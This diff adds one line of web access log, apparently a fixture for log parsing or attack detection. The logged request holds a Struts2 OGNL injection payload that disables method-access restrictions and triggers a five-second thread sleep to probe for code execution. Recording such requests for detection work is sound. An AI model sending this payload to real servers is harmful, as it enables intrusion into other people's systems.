@@ -1,0 +1,4 @@
+
+"1543646651254" "1.204.194.98" "-" "01/Dec/2018:14:44:11 +0800" "GET" "/?('\u0023_memberAccess[\'allowStaticMethodAccess\']')(meh)=true&(aaa)(('\u0023context[\'xwork.MethodAccessor.denyMethodExecution\']\u003d\u0023foo')(\u0023foo\u003dnew%20java.lang.Boolean(%22false%22)))&(asdf)(('\u0023thread.sleep(5000)')(\u0023thread\u003d@java.lang.Thread@currentThread()))=1" "HTTP/1.1" "500" "375" "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0)"
+
+
